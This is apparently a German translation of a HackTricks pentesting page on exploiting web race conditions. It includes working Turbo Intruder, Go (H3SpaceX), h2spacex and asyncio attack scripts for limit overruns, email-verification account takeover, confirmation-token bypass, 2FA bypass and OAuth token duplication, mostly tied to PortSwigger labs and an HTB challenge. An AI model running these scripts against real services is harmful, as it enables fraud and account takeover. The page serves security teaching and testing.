# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> Für ein tiefes Verständnis dieser Technik siehe den Originalbericht unter [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)

## Verbesserung von Race Condition-Angriffen

Die größte Hürde bei der Ausnutzung von Race Conditions besteht darin, sicherzustellen, dass mehrere requests gleichzeitig verarbeitet werden, mit **sehr geringen Unterschieden in ihren Verarbeitungszeiten — idealerweise weniger als 1ms**.

Hier findest du einige Techniken zur Synchronisation von Requests:

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**: Ermöglicht das Senden von zwei requests über eine einzelne TCP-Verbindung, wodurch der Einfluss von Netzwerk-Jitter reduziert wird. Aufgrund serverseitiger Variationen reichen zwei requests jedoch möglicherweise nicht für einen zuverlässigen Race Condition-Exploit aus.
- **HTTP/1.1 'Last-Byte Sync'**: Ermöglicht das Vor-Senden der meisten Teile von 20–30 requests, wobei ein kleines Fragment zurückgehalten wird, das dann zusammen gesendet wird, sodass sie gleichzeitig beim Server ankommen.

**Vorbereitung für Last-Byte Sync** umfasst:

1. Senden der headers und body-Daten minus das letzte Byte, ohne den Stream zu beenden.
2. Anhalten für 100ms nach dem ersten Senden.
3. TCP_NODELAY deaktivieren, um Nagle's Algorithmus zur Bündelung der finalen Frames zu nutzen.
4. Pingen, um die Verbindung aufzuwärmen.

Das anschließende Senden der zurückgehaltenen Frames sollte dazu führen, dass sie in einem einzigen Paket ankommen, was mit Wireshark verifizierbar ist. Diese Methode gilt nicht für statische Dateien, die normalerweise nicht in RC attacks involviert sind.

#### HTTP/3 Last‑Frame Synchronization (QUIC)

- **Concept**: HTTP/3 läuft über QUIC (UDP). Es gibt keine TCP-Coalescing oder Nagle, auf die man sich verlassen könnte, daher funktioniert das klassische last‑byte sync nicht mit Standard-Clients. Stattdessen muss man mehrere QUIC stream‑final DATA-Frames (FIN) bewusst in dasselbe UDP-Datagramm zusammenfassen, damit der Server alle Ziel-requests im selben scheduling tick verarbeitet.
- **How to do it**: Verwende eine speziell entwickelte Library, die QUIC-Frame-Control freigibt. Zum Beispiel manipuliert H3SpaceX quic-go, um HTTP/3 last‑frame synchronization sowohl für requests mit Body als auch für GET‑artige requests ohne Body zu implementieren.
- Requests‑with‑body: Sende HEADERS + DATA minus das letzte Byte für N Streams, dann flush das finale Byte aller Streams gemeinsam.
- GET‑style: Erzeuge gefälschte DATA-Frames (oder einen winzigen Body mit Content‑Length) und beende alle Streams in einem Datagramm.
- **Praktische Grenzen**:
- Die Parallelität wird durch den QUIC-Transportparameter max_streams des Peer begrenzt (ähnlich zu HTTP/2’s SETTINGS_MAX_CONCURRENT_STREAMS). Wenn dieser niedrig ist, öffne mehrere H3-Verbindungen und verteile das Race auf diese.
- Die UDP-Datagrammgröße und die Path MTU begrenzen, wie viele stream‑final Frames du zusammenfassen kannst. Die Library kümmert sich um das Aufteilen in mehrere Datagramme falls nötig, aber ein Single‑Datagram-Flush ist am zuverlässigsten.
- **Praxis**: Es gibt öffentliche H2/H3 race labs und Beispiel-Exploits, die H3SpaceX begleiten.

<details>
<summary>HTTP/3 last‑frame sync (Go + H3SpaceX) minimales Beispiel</summary>
```go
package main
import (
"crypto/tls"
"context"
"time"
"github.com/nxenon/h3spacex"
h3 "github.com/nxenon/h3spacex/http3"
)
func main(){
tlsConf := &tls.Config{InsecureSkipVerify:true, NextProtos:[]string{h3.NextProtoH3}}
quicConf := &quic.Config{MaxIdleTimeout:10*time.Second, KeepAlivePeriod:10*time.Millisecond}
conn, _ := quic.DialAddr(context.Background(), "IP:PORT", tlsConf, quicConf)
var reqs []*http.Request
for i:=0;i<50;i++{ r,_ := h3.GetRequestObject("https://target/apply", "POST", map[string]string{"Cookie":"sess=...","Content-Type":"application/json"}, []byte(`{"coupon":"SAVE"}`)); reqs = append(reqs,&r) }
// keep last byte (1), sleep 150ms, set Content-Length
h3.SendRequestsWithLastFrameSynchronizationMethod(conn, reqs, 1, 150, true)
}
```
</details>

### Anpassung an die Server-Architektur

Das Verständnis der Architektur des Ziels ist entscheidend. Front-end-Server können Anfragen unterschiedlich routen, was das Timing beeinflusst. Vorab durchgeführtes serverseitiges Connection warming durch belanglose Anfragen kann die Anfragezeiten normalisieren.

#### Umgang mit sitzungsbasiertem Locking

Frameworks wie der PHP-Session-Handler serialisieren Requests pro Session und können dadurch Schwachstellen verschleiern. Die Verwendung unterschiedlicher Session-Tokens für jede Anfrage kann dieses Problem umgehen.

#### Umgehen von Rate- oder Ressourcenlimits

Wenn Connection warming nicht wirkt, kann das absichtliche Auslösen von Rate- oder Ressourcenlimit-Verzögerungen des Webservers durch eine Flut von Dummy-Anfragen den single-packet attack erleichtern, indem eine serverseitige Verzögerung erzeugt wird, die race conditions begünstigt.

## Angriffsbeispiele

- **Turbo Intruder - HTTP2 single-packet attack (1 endpoint)**: Du kannst die Anfrage an **Turbo intruder** senden (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), im Request den Wert ändern, den du brute-force testen willst für **`%s`**, z. B. in `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` und dann **`examples/race-single-packer-attack.py`** aus dem Drop-down auswählen:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

Wenn du **verschiedene Werte senden** willst, könntest du den Code mit diesem hier anpassen, der eine wordlist aus der Zwischenablage verwendet:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> Wenn die Website HTTP2 nicht unterstützt (nur HTTP1.1), verwende `Engine.THREADED` oder `Engine.BURP` anstelle von `Engine.BURP2`.

- **Turbo Intruder - HTTP2 single-packet attack (Several endpoints)**: Falls du eine Anfrage an einen Endpoint senden und anschließend mehrere an andere Endpoints schicken musst, um die RCE auszulösen, kannst du das Script `race-single-packet-attack.py` z. B. wie folgt ändern:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- Es ist außerdem in **Repeater** über die neue Option '**Send group in parallel**' in Burp Suite verfügbar.
- Für **limit-overrun** könntest du einfach **dieselbe request 50 Mal** in die **group** hinzufügen.
- Für **connection warming** könntest du am **Anfang** der **group** einige **requests** an einen nicht statischen Teil des Webservers **hinzufügen**.
- Für das **delaying** des Prozesses **between** der Verarbeitung **one request and another** in einem 2-Substates-Schritt könntest du **add extra requests between** beide requests einfügen.
- Für einen **multi-endpoint** RC könntest du anfangen, die **request** zu senden, die **in den hidden state führt**, und danach **50 requests**, die **den hidden state ausnutzen**.

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Automated python script**: Ziel dieses Skripts ist es, die Email eines Nutzers zu ändern und kontinuierlich zu prüfen, bis der verification token der neuen Email bei der alten Email ankommt (das liegt daran, dass im Code ein RC auftrat, bei dem es möglich war, die Email zu ändern, aber die verification an die alte gesendet wurde, weil die Variable, die die Email angibt, bereits mit der ersten gefüllt war).\
Wenn das Wort "objetivo" in den empfangenen Emails gefunden wird, wissen wir, dass wir den verification token der geänderten Email erhalten haben und beenden den Angriff.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: "+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: "+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
#### Turbo Intruder: Engine- und Gating-Hinweise

- Engine-Auswahl: Verwende `Engine.BURP2` bei HTTP/2-Zielen, um den single‑packet attack auszulösen; weiche für HTTP/1.1 last‑byte sync auf `Engine.THREADED` oder `Engine.BURP` zurück.
- `gate`/`openGate`: Lege viele Kopien mit `gate='race1'` (oder pro‑Versuch Gates) in die Warteschlange, die den Tail jeder Anfrage zurückhalten; `openGate('race1')` spült alle Tails zusammen, sodass sie nahezu gleichzeitig ankommen.
- Diagnose: Negative Zeitstempel in Turbo Intruder zeigen, dass der Server geantwortet hat, bevor die Anfrage vollständig gesendet wurde, was eine Überlappung beweist. Dies ist bei echten race conditions zu erwarten.
- Connection warming: Sende zuerst einen Ping oder ein paar harmlose Requests, um die Timings zu stabilisieren; optional `TCP_NODELAY` deaktivieren, um das Batching der finalen Frames zu begünstigen.


### Verbesserung der Single Packet Attack

In der ursprünglichen Forschung wird erklärt, dass dieser Angriff ein Limit von 1.500 Bytes hat. In [**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/), wird jedoch beschrieben, wie es möglich ist, die 1.500‑Byte‑Beschränkung des single packet attack auf die **65,535 B Fensterbegrenzung von TCP durch Verwendung von IP layer fragmentation** zu erweitern (ein einzelnes Paket in mehrere IP-Pakete aufteilen) und sie in unterschiedlicher Reihenfolge zu senden, wodurch verhindert wird, dass das Paket neu zusammengesetzt wird, bis alle Fragmente den Server erreicht haben. Mit dieser Technik konnte der Forscher etwa 10.000 Requests in ca. 166ms senden.

Beachte, dass diese Verbesserung den Angriff zwar in RCs, die Hunderte/tausende Pakete gleichzeitig benötigen, zuverlässiger macht, sie aber auch auf Software‑Limits stoßen kann. Einige beliebte HTTP‑Server wie Apache, Nginx und Go haben eine strikte Einstellung `SETTINGS_MAX_CONCURRENT_STREAMS` auf 100, 128 bzw. 250. Andere wie NodeJS und nghttp2 haben sie unbegrenzt.\  
Das bedeutet im Wesentlichen, dass Apache nur 100 HTTP‑Streams/Verbindungen aus einer einzelnen TCP‑Verbindung berücksichtigt (was diesen RC‑Angriff einschränkt). Für HTTP/3 ist das analoge Limit der QUIC‑Transportparameter max_streams – ist dieser klein, verteile deinen race auf mehrere QUIC‑Verbindungen.

Beispiele, die diese Technik nutzen, findest du im Repo [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Raw BF

Vor der genannten Forschung wurden einige Payloads verwendet, die einfach versuchten, die Pakete so schnell wie möglich zu senden, um eine RC zu verursachen.

- **Repeater:** Siehe die Beispiele im vorherigen Abschnitt.
- **Intruder**: Sende die **request** an **Intruder**, setze die **number of threads** im **Options‑Menu** auf **30**, wähle als Payload **Null payloads** und generiere **30**.
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Methodik**

### Limit-overrun / TOCTOU

Dies ist der grundlegendste Typ von race condition, bei dem **Schwachstellen** an Stellen **auftreten**, die **die Anzahl der Male begrenzen, die eine Aktion ausgeführt werden kann**. Zum Beispiel die mehrfache Verwendung desselben Rabattcodes in einem Webshop. Ein sehr einfaches Beispiel findet sich in [**diesen Bericht**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) oder in [**diesem Bug**](https://hackerone.com/reports/759247)**.**

Es gibt viele Variationen dieser Angriffsart, einschließlich:

- Mehrfaches Einlösen einer Geschenkkarte
- Mehrfaches Bewerten eines Produkts
- Abheben oder Überweisen von Geld in Höhe über dem Kontostand
- Mehrfaches Verwenden derselben CAPTCHA-Lösung
- Umgehen einer Anti-Brute-Force Rate-Limitierung

### **Versteckte Subzustände**

Das Ausnutzen komplexer race conditions beinhaltet oft das Nutzen kurzer Gelegenheiten, mit versteckten oder **unbeabsichtigten Maschinen-Subzuständen** zu interagieren. So gehst du vor:

1. **Potenzielle versteckte Subzustände identifizieren**
- Beginne damit, Endpoints zu identifizieren, die kritische Daten verändern oder mit ihnen interagieren, z. B. Benutzerprofile oder Passwort-Reset-Prozesse. Konzentriere dich auf:
- **Storage**: Bevorzuge Endpoints, die serverseitig persistente Daten manipulieren gegenüber solchen, die clientseitig Daten verarbeiten.
- **Action**: Suche nach Operationen, die bestehende Daten ändern — diese erzeugen eher ausnutzbare Zustände als solche, die neue Daten hinzufügen.
- **Keying**: Erfolgreiche Angriffe beinhalten meist Operationen, die auf denselben Identifier keyed sind, z. B. username oder reset token.
2. **Erste Tests durchführen**
- Teste die identifizierten Endpoints mit race condition-Angriffen und beobachte Abweichungen vom erwarteten Verhalten. Unerwartete Antworten oder Änderungen in der Applikationslogik können auf eine Schwachstelle hindeuten.
3. **Die Verwundbarkeit demonstrieren**
- Reduziere den Angriff auf die minimale Anzahl von Requests, die zur Ausnutzung nötig sind — oft nur zwei. Dieser Schritt erfordert aufgrund der exakten Zeitsteuerung möglicherweise mehrere Versuche oder Automation.

### Zeitkritische Angriffe

Präzision bei der Zeitsteuerung von Requests kann Schwachstellen aufdecken, besonders wenn vorhersagbare Methoden wie Timestamps für security tokens verwendet werden. Zum Beispiel kann die Erzeugung von Passwort-Reset-Token auf Basis von Timestamps identische Tokens für simultane Requests ermöglichen.

**Um auszunutzen:**

- Verwende präzises Timing, z. B. einen Single-Packet-Angriff, um gleichzeitige password reset requests zu senden. Identische Tokens deuten auf eine Schwachstelle hin.

**Beispiel:**

- Fordere zwei password reset tokens gleichzeitig an und vergleiche sie. Übereinstimmende Tokens weisen auf einen Fehler in der Token-Generierung hin.

**Sieh dir dieses** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **an, um das auszuprobieren.**

## Fallstudien zu versteckten Subzuständen

### Bezahlen & einen Artikel hinzufügen

Sieh dir dieses [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) an, um zu sehen, wie man in einem Shop **bezahlt** und ein **zusätzliches** Artikel **hinzufügt, für das man nicht bezahlen muss**.

### Andere E-Mails bestätigen

Die Idee ist, **eine E-Mail-Adresse zu verifizieren und gleichzeitig auf eine andere zu ändern**, um herauszufinden, ob die Plattform die neue Adresse verifiziert.

### E-Mail auf 2 E-Mail-Adressen ändern (cookie-basiert)

Laut [**dieser Forschung**](https://portswigger.net/research/smashing-the-state-machine) war Gitlab auf diese Weise für eine Übernahme anfällig, weil es möglicherweise **den E-Mail-Verifizierungs-Token einer Adresse an die andere Adresse** sendet.

**Sieh dir dieses** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **an, um das auszuprobieren.**

### Versteckte Datenbankzustände / Confirmation Bypass

Wenn **2 verschiedene Writes** verwendet werden, um **Informationen** in einer **Datenbank** hinzuzufügen, gibt es einen kurzen Zeitraum, in dem **nur die ersten Daten geschrieben wurden**. Zum Beispiel können beim Anlegen eines Benutzers zuerst der **username** und das **password** geschrieben werden und erst danach der **Token**, um das neu erstellte Konto zu bestätigen. Das bedeutet, dass für eine kurze Zeit der **Token zur Bestätigung eines Kontos null** ist.

Daher könnte das **Registrieren eines Accounts und das sofortige Senden mehrerer Requests mit einem leeren Token** (`token=` oder `token[]=` oder jede andere Variation) erlauben, ein Konto **zu bestätigen**, dessen E-Mail man nicht kontrolliert.

**Sieh dir dieses** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **an, um das auszuprobieren.**

### Bypass 2FA

Der folgende Pseudo-Code ist gegenüber race condition verwundbar, weil in einer sehr kurzen Zeitspanne die **2FA nicht durchgesetzt wird**, während die Session erstellt wird:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 ewige Persistenz

Es gibt mehrere [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). Diese Dienste erlauben es, eine Anwendung zu erstellen und Benutzer zu authentifizieren, die beim Provider registriert sind. In order to do so, the **client** will need to **permit your application** to access some of their data inside of the **OAUth provider**.\
Also, bis hierhin ein normaler Login mit google/linkedin/github..., bei dem Ihnen eine Seite angezeigt wird mit der Meldung: "_Application <InsertCoolName> möchte auf Ihre Informationen zugreifen, möchten Sie dies erlauben?_"

#### Race Condition in `authorization_code`

Das **Problem** tritt auf, wenn Sie **es akzeptieren** und automatisch ein **`authorization_code`** an die bösartige Anwendung gesendet wird. Danach missbraucht diese Anwendung eine Race Condition im **OAUth provider**, um mehr als ein AT/RT (_Authentication Token/Refresh Token_) aus dem **`authorization_code`** für Ihr Konto zu erzeugen. Im Grunde wird ausgenutzt, dass Sie der Anwendung Zugriff auf Ihre Daten gewährt haben, um **mehrere Accounts zu erstellen**. Wenn Sie anschließend der Anwendung den Zugriff auf Ihre Daten entziehen, wird ein Paar AT/RT gelöscht, aber die anderen bleiben weiterhin gültig.

#### Race Condition in `Refresh Token`

Sobald Sie einen **gültigen RT** erhalten haben, können Sie versuchen, ihn auszunutzen, um mehrere AT/RT zu generieren, und **selbst wenn der Benutzer die Berechtigungen** für die bösartige Anwendung widerruft, bleiben **mehrere RTs weiterhin gültig.**

## **RC in WebSockets**

- In [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) finden Sie einen PoC in Java, um websocket-Nachrichten **parallel** zu senden und **Race Conditions auch in Web Sockets** auszunutzen.
- Mit Burp’s WebSocket Turbo Intruder können Sie die **THREADED** Engine verwenden, um mehrere WS-Verbindungen zu starten und Payloads parallel zu senden. Beginnen Sie mit dem offiziellen Beispiel und passen Sie `config()` (thread count) für die Parallelität an; das ist oft zuverlässiger als Batching auf einer einzelnen Verbindung, wenn man serverseitigen Zustand über WS-Handler hinweg im Rahmen einer Race Condition ausnutzt. Siehe [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).

## Referenzen

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)
- [H3SpaceX (HTTP/3 last‑frame sync) – Go package docs](https://pkg.go.dev/github.com/nxenon/h3spacex)
- [PacketSprinter: Simplifying HTTP/2 Single‑Packet Testing (Route Zero blog)](https://routezero.security/2024/11/17/introducing-packetsprinter-for-burp-suite-simplifying-http-2-single-packet-attack-testing/)

{{#include ../banners/hacktricks-training.md}}
